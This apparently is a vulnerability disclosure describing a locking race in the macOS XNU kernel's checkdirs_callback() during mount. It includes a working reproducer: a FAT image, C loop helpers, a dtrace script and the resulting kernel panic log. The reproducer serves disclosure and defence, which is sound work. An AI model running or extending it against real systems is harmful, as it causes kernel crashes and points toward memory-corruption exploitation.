@@ -1,0 +1,250 @@
+On macOS, when a new mount point is created, the kernel uses checkdirs() to, as
+a comment above the function explains: "Scan all active processes to see if any
+of them have a current or root directory onto which the new filesystem has just
+been mounted. If so, replace them with the new mount point."
+
+In other words, XNU behaves as follows:
+
+$ hdiutil attach ./mount_cwd.img -nomount
+/dev/disk2
+$ cd mnt
+$ ls -l
+total 0
+-rw-r--r--  1 projectzero  staff  0 Aug  6 18:05 underlying
+$ mount -t msdos -o nobrowse /dev/disk2 .
+$ ls -l
+total 0
+-rwxrwxrwx  1 projectzero  staff  0 Aug  6 18:04 onfat
+$
+
+(This is different from e.g. Linux, where the cwd would still point to the
+directory on the root filesystem that is now covered by the mountpoint, and the
+second "ls -l" would show the same output as the first one.)
+
+
+checkdirs() uses proc_iterate() to execute checkdirs_callback() on each running
+process. checkdirs_callback() is implemented as follows:
+
+======================================================
+static int
+checkdirs_callback(proc_t p, void * arg)
+{
+        struct cdirargs * cdrp = (struct cdirargs * )arg;
+        vnode_t olddp = cdrp->olddp;
+        vnode_t newdp = cdrp->newdp;
+        struct filedesc *fdp;
+        vnode_t tvp;
+        vnode_t fdp_cvp;
+        vnode_t fdp_rvp;
+        int cdir_changed = 0;
+        int rdir_changed = 0;
+
+        /*
+         * XXX Also needs to iterate each thread in the process to see if it
+         * XXX is using a per-thread current working directory, and, if so,
+         * XXX update that as well.
+         */
+
+        proc_fdlock(p);
+        fdp = p->p_fd;
+        if (fdp == (struct filedesc *)0) {
+                proc_fdunlock(p);
+                return(PROC_RETURNED);
+        }
+        fdp_cvp = fdp->fd_cdir;
+        fdp_rvp = fdp->fd_rdir;
+        proc_fdunlock(p);
+
+        if (fdp_cvp == olddp) {
+                vnode_ref(newdp);
+                tvp = fdp->fd_cdir;
+                fdp_cvp = newdp;
+                cdir_changed = 1;
+                vnode_rele(tvp);
+        }
+        if (fdp_rvp == olddp) {
+                vnode_ref(newdp);
+                tvp = fdp->fd_rdir;
+                fdp_rvp = newdp;
+                rdir_changed = 1;
+                vnode_rele(tvp);
+        }
+        if (cdir_changed || rdir_changed) {
+                proc_fdlock(p);
+                fdp->fd_cdir = fdp_cvp;
+                fdp->fd_rdir = fdp_rvp;
+                proc_fdunlock(p);
+        }
+        return(PROC_RETURNED);
+}
+======================================================
+
+`p->p_fd` contains the current working directory (`->fd_cdir`) and
+root directory (`->fd_rdir`) of the process; it is protected against
+modification by proc_fdlock()/proc_fdunlock(). Because checkdirs_callback()
+does not hold that lock across the entire operation, several races are possible;
+for example:
+
+ - If `fdp->fd_cdir == olddp` is true and `fdp->fd_cdir` changes between the
+   read `tvp = fdp->fd_cdir;` and the second `proc_fdlock(p);`,
+   `vnode_rele(tvp);` will release a nonexistent reference, leading to reference
+   count underflow.
+ - If `fdp->fd_cdir == olddp` is true and the process calls chroot() between the
+   first locked region and the second locked region, a dangling pointer will be
+   written back to `fdp->fd_rdir`.
+
+
+I have written a simple reproducer for the first scenario; however, since the
+race window is quite narrow, it uses dtrace to make the race easier to hit (so
+you have to turn off SIP).
+
+
+To prepare an empty FAT32 filesystem and the PoC:
+======================================================
+Projects-Mac-mini:mount_cwd projectzero$ base64 -D | gunzip > mount_cwd.img
+H4sIAI3cSV0CA+3TLUsEcRAH4PUQlBMPk2Dyj82yoNmgQZsv4bQIwsrt6XLn7nG75cDgR/BziEls
+ghiu3rewXTGa1C0GszafZwZm4NcGZrp1e9XrlnE3qaLG7EzUqGv+vRGFaDv6dhOtb40fxgeH4WBn
+fzfU9nbaG5v1bK0+n17fr71UCyePrae5aLJ0Nn3bfJ0sT1amH+3LrAx150UVknBeFFVy3k9DJyt7
+cQhH/TQp05DlZTr8kXf7xWAwCkneWWwOhmlZ1uso9NJRqIpQDevkIsnyEMdxWGxG/Mbx3fvnpzPA
+P+X/AQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+EtfAgGlzAAA
+EAA=
+Projects-Mac-mini:mount_cwd projectzero$ 
+Projects-Mac-mini:mount_cwd projectzero$ cat > flipflop2.c
+#include <fcntl.h>
+#include <err.h>
+#include <unistd.h>
+#include <stdio.h>
+
+int main(void) {
+  int outer_fd = open(".", O_RDONLY);
+  if (outer_fd == -1) err(1, "open outer");
+  int inner_fd = open("mnt", O_RDONLY);
+  if (inner_fd == -1) err(1, "open inner");
+
+  while (1) {
+    if (fchdir(inner_fd)) perror("chdir 1");
+    if (fchdir(outer_fd)) perror("chdir 2");
+  }
+}
+Projects-Mac-mini:mount_cwd projectzero$ cc -o flipflop2 flipflop2.c
+Projects-Mac-mini:mount_cwd projectzero$ cat > mountloop.c
+#include <stdlib.h>
+#include <stdio.h>
+#include <err.h>
+
+int main(int argc, char **argv) {
+  char mount_cmd[1000];
+  sprintf(mount_cmd, "mount -t msdos -o nobrowse %s mnt", argv[1]);
+  while (1) {
+    if (system(mount_cmd) != 0)
+      errx(1, "mount failed");
+umount:;
+    if (system("umount mnt")) {
+      puts("umount failed");
+      goto umount;
+    }
+  }
+}
+Projects-Mac-mini:mount_cwd projectzero$ cc -o mountloop mountloop.c
+Projects-Mac-mini:mount_cwd projectzero$ 
+Projects-Mac-mini:mount_cwd projectzero$ cat > test.dtrace
+#!/usr/sbin/dtrace -w -s
+
+__mac_mount:entry  { mount_pending = 1; }
+__mac_mount:return { mount_pending = 0; }
+proc_iterate:entry  { in_proc_iterate = 1; }
+proc_iterate:return { in_proc_iterate = 0; }
+
+vnode_rele_internal:entry {
+  if (mount_pending && in_proc_iterate) {
+    chill(1000*1000*10);
+  }
+}
+Projects-Mac-mini:mount_cwd projectzero$ 
+Projects-Mac-mini:mount_cwd projectzero$ chmod +x test.dtrace 
+Projects-Mac-mini:mount_cwd projectzero$ 
+Projects-Mac-mini:mount_cwd projectzero$ mkdir mnt
+Projects-Mac-mini:mount_cwd projectzero$ 
+======================================================
+
+In one terminal, launch the dtrace script as root:
+======================================================
+Projects-Mac-mini:mount_cwd projectzero$ sudo ./test.dtrace 
+dtrace: script './test.dtrace' matched 10 probes
+dtrace: allowing destructive actions
+======================================================
+
+In a second terminal, set up the loop device and launch the ./flipflop2 helper:
+======================================================
+Projects-Mac-mini:mount_cwd projectzero$ hdiutil attach ./mount_cwd.img -nomount
+/dev/disk2                                              
+Projects-Mac-mini:mount_cwd projectzero$ ./flipflop2 
+======================================================
+
+In a third terminal, launch the ./mountloop helper:
+======================================================
+Projects-Mac-mini:mount_cwd projectzero$ ./mountloop /dev/disk2
+umount(/Users/projectzero/jannh/mount_cwd/clean/mount_cwd/mnt): Resource busy -- try 'diskutil unmount'
+umount failed
+umount(/Users/projectzero/jannh/mount_cwd/clean/mount_cwd/mnt): Resource busy -- try 'diskutil unmount'
+umount failed
+umount(/Users/projectzero/jannh/mount_cwd/clean/mount_cwd/mnt): Resource busy -- try 'diskutil unmount'
+umount failed
+[...]
+======================================================
+
+(Don't mind the error spew from ./flipflop2 and ./mountloop, that's normal.)
+
+Within a few minutes, the system should panic, with an error report like this:
+======================================================
+*** Panic Report ***
+panic(cpu 0 caller 0xffffff80055f89c5): "vnode_rele_ext: vp 0xffffff80276ee458 kusecount(4) out of balance with usecount(3).  v_tag = 25, v_type = 2, v_flag = 84800."@/BuildRoot/Library/Caches/com.apple.xbs/Sources/xnu/xnu-4903.270.47/bsd/vfs/vfs_subr.c:1937
+Backtrace (CPU 0), Frame : Return Address
+0xffffff911412b9d0 : 0xffffff80053ad6ed mach_kernel : _handle_debugger_trap + 0x47d
+0xffffff911412ba20 : 0xffffff80054e9185 mach_kernel : _kdp_i386_trap + 0x155
+0xffffff911412ba60 : 0xffffff80054da8ba mach_kernel : _kernel_trap + 0x50a
+0xffffff911412bad0 : 0xffffff800535ab40 mach_kernel : _return_from_trap + 0xe0
+0xffffff911412baf0 : 0xffffff80053ad107 mach_kernel : _panic_trap_to_debugger + 0x197
+0xffffff911412bc10 : 0xffffff80053acf53 mach_kernel : _panic + 0x63
+0xffffff911412bc80 : 0xffffff80055f89c5 mach_kernel : _vnode_rele_internal + 0xf5
+0xffffff911412bcc0 : 0xffffff8005607f34 mach_kernel : _dounmount + 0x524
+0xffffff911412bd60 : 0xffffff8005607877 mach_kernel : _unmount + 0x197
+0xffffff911412bf40 : 0xffffff80059b92ad mach_kernel : _unix_syscall64 + 0x27d
+0xffffff911412bfa0 : 0xffffff800535b306 mach_kernel : _hndl_unix_scall64 + 0x16
+
+BSD process name corresponding to current thread: umount
+Boot args: -zp -v keepsyms=1
+
+Mac OS version:
+18G87
+
+Kernel version:
+Darwin Kernel Version 18.7.0: Thu Jun 20 18:42:21 PDT 2019; root:xnu-4903.270.47~4/RELEASE_X86_64
+Kernel UUID: 982F17B3-0252-37FB-9869-88B3B1C77335
+Kernel slide:     0x0000000005000000
+Kernel text base: 0xffffff8005200000
+__HIB  text base: 0xffffff8005100000
+System model name: Macmini7,1 (Mac-35C5E08120C7EEAF)
+
+System uptime in nanoseconds: 390113393507
+last loaded kext at 197583647618: com.apple.filesystems.msdosfs 1.10 (addr 0xffffff7f89287000, size 69632)
+last unloaded kext at 61646619017: com.apple.driver.AppleIntelLpssGspi  3.0.60 (addr 0xffffff7f88208000, size 45056)
+[...]
+======================================================
